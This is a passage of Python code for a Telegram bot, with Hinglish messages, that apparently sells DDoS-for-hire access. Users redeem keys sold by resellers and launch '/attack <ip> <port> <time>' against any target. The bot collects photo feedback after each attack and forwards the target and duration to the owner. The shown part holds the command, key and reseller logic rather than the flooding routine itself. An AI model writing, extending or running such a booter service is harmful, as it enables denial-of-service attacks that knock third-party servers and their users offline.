    if is_owner(user_id):
        response = f'''👑 Welcome Owner, {user_name}!

Use /help to see all commands.'''
    elif is_reseller(user_id):
        response = f'''💼 Welcome Reseller, {user_name}!

Use /help to see your commands.'''
    else:
        response = f'''👋 Welcome, {user_name}!

🔐 Commands:
• /redeem <key> - Key redeem karo
• /mykey - Key details dekho
• /status - Attack status dekho
• /attack <ip> <port> <time> - Attack start karo'''
    
    bot.reply_to(message, response)

@bot.message_handler(content_types=['photo'])
def handle_feedback_photo(message):
    user_id = message.from_user.id
    
    if user_id == BOT_OWNER:
        return
    
    fb = get_pending_feedback(user_id)
    if not fb:
        return
    
    clear_pending_feedback(user_id)
    
    user_name = message.from_user.first_name
    username = message.from_user.username
    
    bot.reply_to(message, "✅ 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞 𝗥𝗘𝗖𝗘𝗜𝗩𝗘𝗗!\n\n🎉 Shukriya feedback ke liye!\n\n⚡ Ab tum naya attack laga sakte ho.\nUse /attack <ip> <port> <time>")
    
    try:
        owner_msg = f"📸 ??𝗘𝗪 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞\n\n"
        owner_msg += f"👤 User: {user_name}\n"
        if username:
            owner_msg += f"📛 Username: @{username}\n"
        owner_msg += f"🆔 ID: {user_id}\n\n"
        owner_msg += f"🎯 Target: {fb['target']}:{fb['port']}\n"
        owner_msg += f"⏱️ Duration: {fb['duration']}s"
        
        bot.send_photo(BOT_OWNER, message.photo[-1].file_id, caption=owner_msg)
    except:
        pass

print("Bot is starting...")
while True:
    try:
        bot.polling(none_stop=True, interval=0, timeout=20)
    except Exception as e:
        print("Polling crashed, restarting...", e)
        time.sleep(3)
